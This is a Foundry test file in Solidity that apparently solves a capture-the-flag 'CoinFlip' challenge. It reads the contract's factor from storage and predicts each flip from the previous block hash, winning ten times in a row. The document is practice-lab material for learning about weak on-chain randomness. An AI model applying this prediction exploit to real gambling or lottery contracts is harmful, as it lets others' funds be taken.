// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test,console2} from "forge-std/Test.sol";
import {CoinFlip} from "../CoinFlip.sol";

contract CoinFlipTest is Test {
    CoinFlip coinFlip;
    function setUp() public {
        coinFlip = new CoinFlip();
    }
    function test_Challenge3_Passed() public {
        flipCoin();
    }
    function flipCoin() public {
        // Reads storage slot to take value (FACTOR)
        bytes32 factor = vm.load(address(coinFlip), bytes32(uint256(2)));
        uint256 good;
        uint256 bad;
        // guess correctly 10 times in a row
        for (uint256 i = 0; i < 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 win = blockValue/uint256(factor);
            if(win == 1) {
                coinFlip.flip(true);
                good++;
            } else {
                coinFlip.flip(false);
                bad++;
            }
            vm.roll(block.number + 1);
        }
        console2.log("good amount:", good);
        console2.log("bad amount:", bad);
    }
}